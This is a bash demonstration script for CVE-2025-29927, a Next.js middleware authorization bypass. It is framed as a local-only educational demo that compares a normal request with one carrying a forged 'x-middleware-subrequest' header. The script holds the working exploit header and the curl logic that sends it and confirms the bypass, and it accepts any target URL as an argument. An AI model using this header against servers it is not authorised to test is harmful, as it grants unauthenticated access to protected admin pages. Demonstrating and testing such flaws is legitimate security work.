#!/usr/bin/env bash
# =============================================================================
# demo.sh — CVE-2025-29927: Next.js Middleware Authorization Bypass
# -----------------------------------------------------------------------------
# LOCAL-ONLY educational demo. Run it only against http://localhost.
# Do NOT point it at a server you do not own and have permission to test.
#
# What this script shows, in two requests:
#   [1] A normal visitor with no session is correctly redirected to /login.
#   [2] An attacker who adds ONE forged header walks straight into /admin
#       with no session at all — this is the vulnerability (CVE-2025-29927).
#
# The script prints only the signal (status code + redirect + a proof line),
# never the full HTML page, so it reads cleanly on screen / on camera.
# =============================================================================

# `set -u` makes the script fail loudly if we ever use an unset variable.
set -u

# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------

# Base URL of the running app. Defaults to localhost:3000 (what `npm run dev`
# serves). You can override it:  ./demo.sh http://localhost:3001
BASE="${1:-http://localhost:3000}"

# THE EXPLOIT, in one line.
#
# Next.js uses an INTERNAL header, `x-middleware-subrequest`, to stop its own
# middleware from calling itself forever. On a vulnerable version, Next TRUSTS
# this header even when it comes from the outside. If the header lists the
# middleware's name enough times, Next assumes "we're already too deep in
# recursion" and SKIPS running middleware entirely.
#
# Our middleware file is `middleware.ts` at the project root, so its name is
# `middleware`. The vulnerable code skips middleware once that name appears
# 5 times (its MAX_RECURSION_DEPTH), so we repeat it 5 times, joined by ":".
#
# With middleware skipped, the auth check never runs — and the request sails
# through to the page.
FORGED="x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

# Scratch space for the response headers and body of each request. We clean it
# up automatically when the script exits.
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

# -----------------------------------------------------------------------------
# Helper: fire one request and print ONLY the status + redirect target.
#
#   hit <url> [extra curl args...]
#
# curl flags explained:
#   -s            silent (no progress meter)
#   -o <file>     write the response BODY to a file (so it is NOT dumped here)
#   -D <file>     dump the response HEADERS to a file (so we can read Location)
#   -w '%{...}'   print the final HTTP status code to stdout
# We then grep the saved headers for the Location line (the redirect target).
# -----------------------------------------------------------------------------
hit() {
  local url="$1"; shift
  local code
  code=$(curl -s -o "$TMP/body" -D "$TMP/hdr" -w '%{http_code}' "$@" "$url") || {
    echo "  (could not reach $url — is 'npm run dev' running?)"; return 1; }
  local loc
  loc=$(awk 'tolower($1)=="location:"{print $2}' "$TMP/hdr" | tr -d '\r')
  if [ -n "$loc" ]; then
    echo "  HTTP $code  ->  $loc"
  else
    echo "  HTTP $code"
  fi
}

# -----------------------------------------------------------------------------
# Header: which Next.js version are we running, and where.
# 15.2.2 is VULNERABLE; 15.2.3+ is PATCHED. Same script works on both.
# -----------------------------------------------------------------------------
ver=$(node -e 'console.log(require("next/package.json").version)' 2>/dev/null || echo '?')
echo "Next.js: $ver     Target: $BASE"
echo "=================================================================="
echo "(Each step prints the curl command you can run yourself. 'curl -i'"
echo " shows status+headers+HTML; this script tidies that to the status"
echo " line + a one-line proof so it stays readable on screen.)"

# -----------------------------------------------------------------------------
# [1] BASELINE — the app works as intended for an honest user.
# No session cookie -> the middleware redirects us to /login (HTTP 307).
# This proves the protection exists in the first place.
# -----------------------------------------------------------------------------
echo
echo "[1] Honest user, NO session cookie      GET /admin"
echo "    \$ curl -i $BASE/admin"
hit "$BASE/admin"
echo "    expected: 307 -> /login   (middleware redirects)"

# -----------------------------------------------------------------------------
# [2] THE ATTACK — same request, plus the forged header.
# The ONLY difference from [1] is the extra header. If the build is vulnerable,
# middleware is skipped and /admin renders for an attacker with no session:
# the grep below will find the admin page's headline in the response body.
# -----------------------------------------------------------------------------
echo
echo "[2] Attacker forges the header          GET /admin   (+ forged header)"
echo "    \$ curl -i -H \"$FORGED\" $BASE/admin"
hit "$BASE/admin" -H "$FORGED"
if grep -q "Welcome, authenticated admin" "$TMP/body"; then
  # The protected content leaked into the response -> the bypass worked.
  echo "    >>> BYPASS SUCCEEDED: admin page served with no session cookie"
else
  # On a patched build the forged header is ignored, so we get redirected
  # and the admin headline is NOT in the body.
  echo "    >>> bypass failed (this is a PATCHED build — good)"
fi
echo
